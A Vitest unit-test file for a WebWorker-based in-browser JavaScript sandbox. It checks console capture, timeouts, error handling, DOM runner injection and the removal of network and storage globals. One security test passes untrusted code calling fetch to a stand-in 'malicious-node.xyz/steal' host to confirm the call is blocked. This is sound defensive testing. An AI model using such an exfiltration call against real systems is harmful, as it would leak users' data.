/**
 * Unit Tests: Secure In-Browser WebWorker Code Sandbox
 * Validates execution isolation, memory/time bounds, dangerous global elimination,
 * console interception, circular reference resilience, and DOM runner integration.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import {
  executeInSandbox,
  attachSandboxRunnersToDOM,
  renderTerminalOutput,
  buildWorkerScript,
  codeSandbox,
  CodeSandbox,
} from '../src/code-sandbox.js';
import { serviceRegistry, SERVICES } from '../src/service-registry.js';

/**
 * Lightweight Mock DOM Element for testing DOM manipulation and event handlers.
 */
class MockDOMElement {
  public id: string = '';
  public className: string = '';
  public textContent: string = '';
  public innerHTML: string = '';
  public disabled: boolean = false;
  public type: string = '';
  public parentElement: MockDOMElement | null = null;
  public parentNode: MockDOMElement | null = null;
  public nextSibling: MockDOMElement | null = null;
  public children: MockDOMElement[] = [];
  public style: Record<string, string> = {};
  private attributes: Map<string, string> = new Map();
  private listeners: Map<string, Array<(e?: any) => void>> = new Map();

  constructor(public tagName: string = 'div') {}

  public setAttribute(name: string, val: string): void {
    this.attributes.set(name, val);
    if (name === 'id') this.id = val;
    if (name === 'class') this.className = val;
  }

  public getAttribute(name: string): string | null {
    return this.attributes.get(name) ?? null;
  }

  public removeAttribute(name: string): void {
    this.attributes.delete(name);
  }

  public appendChild<T extends MockDOMElement>(child: T): T {
    child.parentElement = this;
    child.parentNode = this;
    this.children.push(child);
    return child;
  }

  public insertBefore<T extends MockDOMElement>(newChild: T, refChild: MockDOMElement | null): T {
    newChild.parentElement = this;
    newChild.parentNode = this;
    if (!refChild) {
      this.children.push(newChild);
    } else {
      const idx = this.children.indexOf(refChild);
      if (idx !== -1) {
        this.children.splice(idx, 0, newChild);
      } else {
        this.children.push(newChild);
      }
    }
    return newChild;
  }

  public remove(): void {
    if (this.parentElement) {
      const idx = this.parentElement.children.indexOf(this);
      if (idx !== -1) {
        this.parentElement.children.splice(idx, 1);
      }
      this.parentElement = null;
      this.parentNode = null;
    }
  }

  public addEventListener(event: string, handler: (e?: any) => void): void {
    if (!this.listeners.has(event)) {
      this.listeners.set(event, []);
    }
    this.listeners.get(event)!.push(handler);
  }

  public dispatchEvent(e: any): boolean {
    const type = typeof e === 'string' ? e : e?.type;
    const handlers = this.listeners.get(type) || [];
    for (const h of handlers) {
      h(e);
    }
    return true;
  }

  public click(): void {
    this.dispatchEvent({ type: 'click', target: this, currentTarget: this });
  }

  public querySelector<T extends MockDOMElement = MockDOMElement>(selector: string): T | null {
    const list = this.querySelectorAll<T>(selector);
    return list[0] || null;
  }

  public querySelectorAll<T extends MockDOMElement = MockDOMElement>(selector: string): T[] {
    const results: T[] = [];
    const parts = selector.split(',').map((s) => s.trim());

    const checkMatch = (node: MockDOMElement, sel: string): boolean => {
      // Space separated descendant selector: e.g. "pre code"
      if (sel.includes(' ')) {
        const tokens = sel.split(/\s+/);
        if (tokens.length === 2) {
          const [parentSel, childSel] = tokens;
          if (this.matchesSelector(node, childSel)) {
            let curr = node.parentElement;
            while (curr) {
              if (this.matchesSelector(curr, parentSel)) return true;
              curr = curr.parentElement;
            }
          }
          return false;
        }
      }
      return this.matchesSelector(node, sel);
    };

    const walk = (node: MockDOMElement) => {
      for (const sel of parts) {
        if (checkMatch(node, sel)) {
          results.push(node as unknown as T);
          break;
        }
      }
      for (const child of node.children) {
        walk(child);
      }
    };

    for (const child of this.children) {
      walk(child);
    }
    return results;
  }

  public closest<T extends MockDOMElement = MockDOMElement>(selector: string): T | null {
    let curr: MockDOMElement | null = this;
    while (curr) {
      if (this.matchesSelector(curr, selector)) return curr as unknown as T;
      curr = curr.parentElement;
    }
    return null;
  }

  private matchesSelector(node: MockDOMElement, sel: string): boolean {
    if (sel.startsWith('.')) {
      const cls = sel.slice(1);
      return (node.className || '').split(/\s+/).includes(cls);
    }
    if (sel.startsWith('#')) {
      return node.id === sel.slice(1);
    }
    if (sel.startsWith('[') && sel.endsWith(']')) {
      const attrExpr = sel.slice(1, -1);
      if (attrExpr.includes('=')) {
        const [k, v] = attrExpr.split('=');
        const cleanV = v.replace(/["']/g, '');
        return node.getAttribute(k) === cleanV;
      }
      return node.getAttribute(attrExpr) !== null;
    }
    return node.tagName.toLowerCase() === sel.toLowerCase();
  }
}

describe('Secure In-Browser WebWorker Code Sandbox', () => {
  // ─── 1. Successful Code Execution & Console Interception ───────────────────
  describe('1. Successful Code Execution & Console Stream Capture', () => {
    it('captures simple console.log statements accurately', async () => {
      const result = await executeInSandbox("console.log('Sovereign Zero-Knowledge Protocol');");

      expect(result.success).toBe(true);
      expect(result.error).toBeUndefined();
      expect(result.output.length).toBe(1);
      expect(result.output[0].level).toBe('log');
      expect(result.output[0].args).toEqual(['Sovereign Zero-Knowledge Protocol']);
      expect(result.executionTimeMs).toBeGreaterThanOrEqual(0);
    });

    it('captures all console stream levels (log, info, warn, error)', async () => {
      const code = `
        console.log('level log');
        console.info('level info');
        console.warn('level warn');
        console.error('level error');
      `;
      const result = await executeInSandbox(code);

      expect(result.success).toBe(true);
      expect(result.output.length).toBe(4);
      expect(result.output[0]).toEqual({ level: 'log', args: ['level log'] });
      expect(result.output[1]).toEqual({ level: 'info', args: ['level info'] });
      expect(result.output[2]).toEqual({ level: 'warn', args: ['level warn'] });
      expect(result.output[3]).toEqual({ level: 'error', args: ['level error'] });
    });

    it('captures multiple arguments in a single console call', async () => {
      const result = await executeInSandbox("console.log('Active Relays:', 42, true, null);");

      expect(result.success).toBe(true);
      expect(result.output[0].args).toEqual(['Active Relays:', '42', 'true', 'null']);
    });

    it('safely handles and serializes circular references without throwing', async () => {
      const code = `
        const node = { id: 'peer-01' };
        node.selfRef = node;
        console.log(node);
      `;
      const result = await executeInSandbox(code);

      expect(result.success).toBe(true);
      expect(result.output.length).toBe(1);
      const outputText = result.output[0].args[0];
      expect(outputText).toContain('"id": "peer-01"');
      expect(outputText).toContain('[Circular]');
    });

    it('safely serializes complex nested arrays, BigInt, and functions', async () => {
      const code = `
        const payload = {
          count: 100n,
          items: [1, 2, { fn: function compute() {} }]
        };
        console.log(payload);
      `;
      const result = await executeInSandbox(code);

      expect(result.success).toBe(true);
      const text = result.output[0].args[0];
      expect(text).toContain('100n');
      expect(text).toContain('[Function: compute]');
    });
  });

  // ─── 2. Arithmetic, Loops, Functions & Return Values ───────────────────────
  describe('2. Arithmetic, Loops, Functions & Return Values', () => {
    it('evaluates arithmetic expressions and returns correct value', async () => {
      const result = await executeInSandbox('return 21 * 2 + 10 / 2;');

      expect(result.success).toBe(true);
      expect(result.returnValue).toBe(47);
    });

    it('evaluates expression without explicit return keyword', async () => {
      const result = await executeInSandbox('50 * 4 + 10');

      expect(result.success).toBe(true);
      expect(result.returnValue).toBe(210);
    });

    it('executes iterative loops and computes cumulative sums', async () => {
      const code = `
        let total = 0;
        for (let i = 1; i <= 100; i++) {
          total += i;
        }
        return total;
      `;
      const result = await executeInSandbox(code);

      expect(result.success).toBe(true);
      expect(result.returnValue).toBe(5050);
    });

    it('executes user-defined recursive functions cleanly', async () => {
      const code = `
        function factorial(n) {
          if (n <= 1) return 1;
          return n * factorial(n - 1);
        }
        return factorial(5);
      `;
      const result = await executeInSandbox(code);

      expect(result.success).toBe(true);
      expect(result.returnValue).toBe(120);
    });

    it('supports asynchronous promises and async/await operations', async () => {
      const code = `
        const delayedValue = await new Promise(resolve => {
          setTimeout(() => resolve(999), 30);
        });
        return delayedValue;
      `;
      const result = await executeInSandbox(code);

      expect(result.success).toBe(true);
      expect(result.returnValue).toBe(999);
      expect(result.executionTimeMs).toBeGreaterThanOrEqual(20);
    });
  });

  // ─── 3. Hard Timeout Enforcement ──────────────────────────────────────────
  describe('3. Hard Timeout Enforcement & Worker Termination', () => {
    it('terminates infinite loops strictly within specified timeoutMs', async () => {
      const startTime = performance.now();
      const result = await executeInSandbox('while (true) {}', { timeoutMs: 80 });
      const elapsed = performance.now() - startTime;

      expect(result.success).toBe(false);
      expect(result.error).toBe('Execution timed out: 80ms limit exceeded');
      expect(result.executionTimeMs).toBe(80);
      // Ensure it did not hang and terminated around 80-250ms
      expect(elapsed).toBeLessThan(1000);
    });

    it('uses default 2000ms timeout when timeoutMs is omitted', () => {
      const script = buildWorkerScript('console.log(1);');
      expect(script).toBeDefined();
    });
  });

  // ─── 4. Security Isolation & Dangerous Globals ─────────────────────────────
  describe('4. Security Isolation & Dangerous Globals Elimination', () => {
    it('ensures network and storage APIs are undefined inside sandbox', async () => {
      const code = `
        return {
          hasFetch: typeof fetch !== 'undefined',
          hasXHR: typeof XMLHttpRequest !== 'undefined',
          hasWS: typeof WebSocket !== 'undefined',
          hasIDB: typeof indexedDB !== 'undefined',
          hasWorker: typeof Worker !== 'undefined',
          hasImportScripts: typeof importScripts !== 'undefined',
          hasLocalStorage: typeof localStorage !== 'undefined'
        };
      `;
      const result = await executeInSandbox(code);

      expect(result.success).toBe(true);
      expect(result.returnValue).toEqual({
        hasFetch: false,
        hasXHR: false,
        hasWS: false,
        hasIDB: false,
        hasWorker: false,
        hasImportScripts: false,
        hasLocalStorage: false,
      });
    });

    it('fails when untrusted code attempts to invoke fetch', async () => {
      const code = "fetch('https://malicious-node.xyz/steal');";
      const result = await executeInSandbox(code);

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/fetch is not a function|TypeError/);
    });

    it('fails when untrusted code attempts to construct XMLHttpRequest', async () => {
      const code = 'new XMLHttpRequest();';
      const result = await executeInSandbox(code);

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/XMLHttpRequest is not a constructor|TypeError/);
    });

    it('honors allowedGlobals option when selectively permitted', async () => {
      const scriptWithAllowed = buildWorkerScript('1;', { allowedGlobals: ['fetch'] });
      // Dangerous globals script should not disable fetch when in allowedGlobals
      expect(scriptWithAllowed).not.toContain("self.fetch = undefined;");
      expect(scriptWithAllowed).toContain("self.XMLHttpRequest = undefined;");
    });
  });

  // ─── 5. Syntax Error & Runtime Exception Handling ─────────────────────────
  describe('5. Syntax Error & Runtime Exception Handling', () => {
    it('catches and reports syntax errors cleanly without throwing unhandled exceptions', async () => {
      const result = await executeInSandbox('const invalid = ;');

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/SyntaxError/);
    });

    it('catches and reports runtime exceptions (e.g. TypeError on null property)', async () => {
      const result = await executeInSandbox('const obj = null; return obj.missingProperty;');

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/TypeError/);
    });

    it('captures explicitly thrown errors and preserves previous console logs', async () => {
      const code = `
        console.log('Execution stage 1 complete');
        throw new Error('Sovereign integrity check failed');
      `;
      const result = await executeInSandbox(code);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Sovereign integrity check failed');
      expect(result.output.length).toBe(1);
      expect(result.output[0].args).toEqual(['Execution stage 1 complete']);
    });
  });

  // ─── 6. DOM Runner Attachment & Terminal Rendering ─────────────────────────
  describe('6. DOM Runner Attachment & Terminal Rendering', () => {
    let mockContainer: MockDOMElement;
    let originalDoc: any;

    beforeEach(() => {
      mockContainer = new MockDOMElement('div');
      originalDoc = (globalThis as any).document;

      (globalThis as any).document = {
        createElement: (tag: string) => new MockDOMElement(tag),
        body: mockContainer,
      };
    });

    afterEach(() => {
      (globalThis as any).document = originalDoc;
    });

    it('finds supported language code blocks and injects runner toolbar', () => {
      // Create code terminal card with JS code block
      const card = new MockDOMElement('div');
      card.className = 'code-terminal-card';
      const pre = new MockDOMElement('pre');
      const codeEl = new MockDOMElement('code');
      codeEl.className = 'language-javascript';
      codeEl.textContent = "console.log('DOM test');";

      pre.appendChild(codeEl);
      card.appendChild(pre);
      mockContainer.appendChild(card);

      attachSandboxRunnersToDOM(mockContainer as unknown as HTMLElement);

      // Verify runner toolbar was injected
      const toolbar = card.querySelector('.sandbox-runner-toolbar');
      expect(toolbar).not.toBeNull();
      const runBtn = toolbar!.querySelector('.btn-run-sandbox');
      expect(runBtn).not.toBeNull();
      expect(codeEl.getAttribute('data-sandbox-attached')).toBe('true');
    });

    it('supports typescript and short form js/ts language tags', () => {
      const langs = ['language-typescript', 'language-js', 'language-ts', 'syntax-javascript'];

      for (const lang of langs) {
        const card = new MockDOMElement('div');
        const pre = new MockDOMElement('pre');
        const codeEl = new MockDOMElement('code');
        codeEl.className = lang;
        codeEl.textContent = 'return 123;';

        pre.appendChild(codeEl);
        card.appendChild(pre);
        mockContainer.appendChild(card);
      }

      attachSandboxRunnersToDOM(mockContainer as unknown as HTMLElement);

      const toolbars = mockContainer.querySelectorAll('.sandbox-runner-toolbar');
      expect(toolbars.length).toBe(langs.length);
    });

    it('ignores unsupported languages such as python or bash', () => {
      const card = new MockDOMElement('div');
      const pre = new MockDOMElement('pre');
      const codeEl = new MockDOMElement('code');
      codeEl.className = 'language-python';
      codeEl.textContent = 'print("hello")';

      pre.appendChild(codeEl);
      card.appendChild(pre);
      mockContainer.appendChild(card);

      attachSandboxRunnersToDOM(mockContainer as unknown as HTMLElement);

      const toolbar = card.querySelector('.sandbox-runner-toolbar');
      expect(toolbar).toBeNull();
    });

    it('prevents duplicate toolbar injection on repeated calls', () => {
      const card = new MockDOMElement('div');
      const pre = new MockDOMElement('pre');
      const codeEl = new MockDOMElement('code');
      codeEl.className = 'language-javascript';
      codeEl.textContent = 'return 1;';

      pre.appendChild(codeEl);
      card.appendChild(pre);
      mockContainer.appendChild(card);

      attachSandboxRunnersToDOM(mockContainer as unknown as HTMLElement);
      attachSandboxRunnersToDOM(mockContainer as unknown as HTMLElement);

      const toolbars = card.querySelectorAll('.sandbox-runner-toolbar');
      expect(toolbars.length).toBe(1);
    });

    it('renders terminal with header status, execution time, and clear button upon run', async () => {
      const card = new MockDOMElement('div');
      const pre = new MockDOMElement('pre');
      const codeEl = new MockDOMElement('code');
      codeEl.className = 'language-javascript';
      codeEl.textContent = "console.log('Terminal test'); return 42;";

      pre.appendChild(codeEl);
      card.appendChild(pre);
      mockContainer.appendChild(card);

      attachSandboxRunnersToDOM(mockContainer as unknown as HTMLElement);

      const runBtn = card.querySelector<MockDOMElement>('.btn-run-sandbox');
      expect(runBtn).not.toBeNull();

      // Trigger run
      runBtn!.click();

      // Allow async sandbox execution to settle
      await new Promise((r) => setTimeout(r, 150));

      const terminal = card.querySelector<MockDOMElement>('.sandbox-terminal');
      expect(terminal).not.toBeNull();

      const status = terminal!.querySelector('.sandbox-status');
      expect(status).not.toBeNull();
      expect(status!.textContent).toBe('✓ Success');

      const clearBtn = terminal!.querySelector<MockDOMElement>('.btn-sandbox-clear');
      expect(clearBtn).not.toBeNull();

      // Click Clear button and ensure terminal is removed
      clearBtn!.click();
      expect(card.querySelector('.sandbox-terminal')).toBeNull();
    });

    it('formats terminal output with syntax token styling', () => {
      const htmlSuccess = renderTerminalOutput({
        output: [
          { level: 'log', args: ['hello world', '42', 'true', 'null'] },
          { level: 'warn', args: ['warning alert'] },
        ],
        executionTimeMs: 3.5,
        success: true,
        returnValue: 100,
      });

      expect(htmlSuccess).toContain('hello world');
      expect(htmlSuccess).toContain('text-amber-400'); // Number 42
      expect(htmlSuccess).toContain('text-purple-400'); // Boolean true
      expect(htmlSuccess).toContain('text-slate-500'); // null
      expect(htmlSuccess).toContain('text-amber-400'); // Warning icon
      expect(htmlSuccess).toContain('text-cyan-300'); // Return value

      const htmlError = renderTerminalOutput({
        output: [],
        executionTimeMs: 1.2,
        error: 'ReferenceError: invalidIdentifier is not defined',
        success: false,
      });

      expect(htmlError).toContain('ReferenceError: invalidIdentifier is not defined');
      expect(htmlError).toContain('text-rose-400');
    });
  });

  // ─── 7. Dependency Injection & Service Registry ────────────────────────────
  describe('7. Dependency Injection & Service Registry Registration', () => {
    it('is registered in serviceRegistry under CodeSandbox token', () => {
      expect(serviceRegistry.has(SERVICES.CodeSandbox)).toBe(true);
      const resolved = serviceRegistry.resolve(SERVICES.CodeSandbox);
      expect(resolved).toBe(codeSandbox);
      expect(resolved).toBeInstanceOf(CodeSandbox);
    });

    it('provides unified class methods on singleton', async () => {
      const res = await codeSandbox.executeInSandbox('return 100 + 200;');
      expect(res.success).toBe(true);
      expect(res.returnValue).toBe(300);
    });
  });
});
